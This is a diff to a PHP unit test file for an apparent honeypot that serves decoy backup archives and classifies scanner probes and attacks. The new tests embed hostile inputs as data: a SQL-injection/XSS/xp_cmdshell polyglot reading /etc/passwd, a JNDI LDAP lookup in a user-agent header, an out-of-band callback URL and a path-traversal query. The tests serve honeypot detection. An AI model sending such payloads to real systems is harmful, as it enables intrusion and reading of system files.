@@ -25,7 +25,10 @@ final class DecoyArchiveServeTest extends TestCase
     /** @var array<string,mixed>|null */
     private static $full;
 
-    private function engine(bool $decoys = true, bool $anyName = false, ?Observer $observer = null, bool $fullStore = false): Honeypot
+    private const WAF_POLYGLOT = 'AND 1=1 UNION ALL SELECT 1,NULL,\'<script>alert("XSS")</script>\',table_name'
+        . ' FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell(\'cat ../../../etc/passwd\')#';
+
+    private function engine(bool $decoys = true, bool $anyName = false, ?Observer $observer = null, bool $fullStore = false, bool $attacks = false): Honeypot
     {
         if ($fullStore) {
             self::$full = self::$full ?? require __DIR__ . '/../../resources/compiled/nuclei-index.full.php';
@@ -37,13 +40,14 @@ final class DecoyArchiveServeTest extends TestCase
         $cfg = new Config('respond', static function (RequestContext $r): bool { return true; });
         $cfg->decoyArchives = $decoys;
         $cfg->decoyArchiveAnyName = $anyName;
+        $cfg->attackEmulation = $attacks;
 
         return new Honeypot(new PhpArrayStore($idx), $cfg, $observer);
     }
 
-    private function req(string $path, string $method = 'GET'): RequestContext
+    private function req(string $path, string $method = 'GET', string $query = '', array $headers = []): RequestContext
     {
-        return new RequestContext($method, $path, '', [], null, 'x.test');
+        return new RequestContext($method, $path, $query, $headers, null, 'x.test');
     }
 
     public function test_flag_off_keeps_the_host_404(): void
@@ -64,7 +68,51 @@ final class DecoyArchiveServeTest extends TestCase
         self::assertSame("PK\x03\x04", substr($r->body, 0, 4));
         self::assertGreaterThan(900000, strlen($r->body));
         self::assertSame([Outcome::SERVED], $observer->outcomes);
-        self::assertSame(0, $observer->detections, 'a decoy archive is not a detection');
+        self::assertSame([['decoy-backup-archive']], $observer->detectionIds, 'a backup-archive fetch is a scanner probe');
+    }
+
+    public function test_it_classifies_as_a_low_severity_scanner_probe(): void
+    {
+        $v = $this->engine()->classify($this->req('/www.tar.gz'), SiteProfile::empty());
+        self::assertSame(Verdict::SCANNER_PROBE, $v->classification);
+        self::assertSame('low', $v->severity);
+        self::assertSame(['decoy-backup-archive'], $v->detection->templateIds());
+    }
+
+    public function test_out_of_band_signals_fold_onto_the_decoy_and_still_fire(): void
+    {
+        $observer = new RecordingObserver();
+        $r = $this->engine(true, false, $observer)->respond($this->req(
+            '/backup.zip', 'GET', 'u=' . rawurlencode('http://abc.oast.fun/x'), ['user-agent' => '${jndi:ldap://x.oast.fun/a}']
+        ));
+        self::assertNotNull($r);
+        self::assertCount(1, $observer->detectionIds);
+        self::assertContains('decoy-backup-archive', $observer->detectionIds[0]);
+        self::assertContains('oast-callback', $observer->detectionIds[0]);
+    }
+
+    public function test_waf_check_polyglot_gets_the_same_decoy_as_the_plain_request(): void
+    {
+        $engine = $this->engine(true, false, null, false, true);
+        $plain = $engine->respond($this->req('/backup.zip'));
+        $poly = $engine->respond($this->req('/backup.zip', 'GET', 'id=' . rawurlencode(self::WAF_POLYGLOT)));
+        self::assertNotNull($plain);
+        self::assertNotNull($poly, 'the polyglot must not split 200 vs 404 on a decoy path');
+        self::assertSame($plain->body, $poly->body);
+    }
+
+    public function test_an_attack_rule_on_the_same_path_still_wins(): void
+    {
+        $v = $this->engine(true, false, null, false, true)
+            ->classify($this->req('/backup.zip', 'GET', 'file=../../../../etc/passwd'), SiteProfile::empty());
+        self::assertSame(Verdict::ATTACK_CLASS, $v->classification);
+        self::assertNotSame(FakeHandle::KIND_DECOY_ARCHIVE, $v->fakeHandle === null ? null : $v->fakeHandle->kind);
+    }
+
+    public function test_a_stored_handle_serves_nothing_once_the_flag_is_off(): void
+    {
+        $h = FakeHandle::decoyArchive('zip', 'backup');
+        self::assertNull($this->engine(false)->synthesizeFromHandle($h, SiteProfile::empty(), 'seed'));
     }
 
     public function test_head_gets_headers_and_length_without_a_body(): void
@@ -119,7 +167,7 @@ final class DecoyArchiveServeTest extends TestCase
         self::assertSame(FakeHandle::KIND_DECOY_ARCHIVE, $h->kind);
         self::assertNotNull($engine->synthesizeFromHandle($h, SiteProfile::empty(), 'seed'));
 
-        foreach (['rar|backup', 'zip|../etc', 'zip|', 'zip', 'zip|A B'] as $key) {
+        foreach (['rar|backup', 'zip|../etc', 'zip|', 'zip', 'zip|A B', 'tar|..', 'zip|-x', 'zip|.hidden'] as $key) {
             $forged = new FakeHandle(FakeHandle::KIND_DECOY_ARCHIVE, $key);
             self::assertNull($engine->synthesizeFromHandle($forged, SiteProfile::empty(), 'seed'), $key);
         }
@@ -137,12 +185,12 @@ final class RecordingObserver implements Observer
     /** @var list<string> */
     public $outcomes = [];
 
-    /** @var int */
-    public $detections = 0;
+    /** @var list<list<string>> */
+    public $detectionIds = [];
 
     public function onDetection(RequestContext $r, Detection $detection): void
     {
-        $this->detections++;
+        $this->detectionIds[] = $detection->templateIds();
     }
 
     public function shouldRespond(RequestContext $r, Detection $detection): bool
